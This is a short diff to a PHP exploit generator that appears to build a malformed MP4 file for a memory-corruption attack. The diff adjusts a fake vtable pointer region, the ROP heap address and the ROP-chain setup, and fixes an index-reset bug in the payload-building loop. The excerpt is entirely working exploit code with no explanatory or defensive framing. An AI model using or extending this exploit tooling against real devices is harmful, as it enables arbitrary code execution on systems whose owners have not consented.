@@ -40,7 +40,7 @@ $heapaddr_stscarraydata_off_x1200 = /*0x39531c88*/$baseaddr+0x577+0x1201 + (($ur
 $fake_vtableptr = $heapaddr_stscarraydata_off_x1200+0x2000;
 $stackptr = $fake_vtableptr+0x2000;
 
-$ROPHEAP = 0x08100000;//Don't use any memory nearby the above mp4 buffer, since that causes corruption issues.
+$ROPHEAP = 0x10000000-0x1e000;//0x08100000;//Don't use any memory nearby the above mp4 buffer, since that causes corruption issues.
 
 $generatebinrop = 1;
 generate_ropchain();
@@ -54,7 +54,7 @@ for($i=0; $i<0x200; $i+=4)//Setup the data which will get copied to the output b
 	$con.= pack("N*", $writeval);
 	
 	$entry_wordindex++;
-	if($entry_wordindex==2)$wordindex = 0;
+	if($entry_wordindex==2)$entry_wordindex = 0;
 }
 
 $con.= pack("C*", 0x0);//Align the offset after this, and as a result the address, to 4-bytes.
